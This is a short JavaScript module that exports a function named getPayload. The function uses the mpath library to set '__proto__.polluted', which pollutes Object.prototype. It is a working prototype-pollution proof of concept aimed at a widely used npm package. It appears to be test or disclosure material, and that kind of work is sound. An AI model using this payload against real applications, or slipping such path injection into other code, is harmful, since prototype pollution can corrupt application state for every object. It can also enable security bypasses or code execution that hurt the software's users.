function getPayload() {
    var mpath = require("mpath");

    var obj = {};
    mpath.set("__proto__.polluted", "yes", obj);
    return { obj };
}

module.exports = { getPayload };